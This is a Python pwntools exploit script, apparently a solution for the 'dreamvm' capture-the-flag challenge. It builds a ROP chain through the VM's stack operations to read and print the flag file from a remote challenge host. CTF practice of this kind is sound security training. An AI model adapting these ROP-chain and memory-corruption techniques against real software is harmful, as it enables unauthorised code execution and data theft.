from pwn import *
import struct
context.arch = 'amd64'
addrTable = {}
elf = ELF('dreamvm')
payload = ''
p = None
stack = []
ropChain = ''

def init():
    global addrTable
    addrTable.update({'rdi' : 0x400903})
    addrTable.update({'rsi' : 0x400901}) #rsi r15 ret
    addrTable.update({'rdx' : 0x400854}) #rdx rbx rbp r12 r13 ret
    addrTable.update({'plt_read' : elf.plt['read']})
    addrTable.update({'write' : elf.plt['write']})
    addrTable.update({'code' : elf.symbols['code']})
    addrTable.update({'main' : elf.symbols['main']})
def writeStack(arr_data):
    global payload,stack
    for idx in range(len(arr_data)):
        payload += struct.pack('B', 6) + struct.pack('B', 1)
        stack.append(arr_data[idx])
def moveStack(size):
    global payload
    payload += struct.pack('B', 4) + struct.pack('<Q', size)
def addDummy():
    global payload
    payload += '\xaa'*(0xff - len(payload))
def buildROP(function=None, rdi=None, rsi=None, rdx=None):
    global addrTable, ropChain
    if rdi or rdi == 0:
        ropChain += p64(addrTable['rdi']) + p64(rdi)
    if rsi:
        ropChain += p64(addrTable['rsi']) + p64(rsi)  + p64(0)
    if rdx:
        ropChain += p64(addrTable['rdx']) + p64(rdx) + p64(0)*4
    if function:
        ropChain += p64(function)

init()
#p = process('dreamvm')
p = remote('host1.dreamhack.games', 16605)
#raw_input('debug: ' + str(p.pid))
stack.append('flag\x00'+ p64(addrTable['code']))
buildROP(addrTable['plt_read'], 0, addrTable['code'], len('flag\x00')+8)
buildROP(rdi = 2)
buildROP(rsi = addrTable['code']+5-8)
buildROP(function = addrTable['main'])
buildROP(addrTable['write'], 1, addrTable['code'], 0x30)
moveStack(0x30 + len(ropChain)) #
writeStack([ropChain[i:i+8] for i in range(0, len(ropChain), 8)])
addDummy()
p.sendline(payload)
for c in range(len(stack)):
    p.send(stack.pop())
p.interactive()
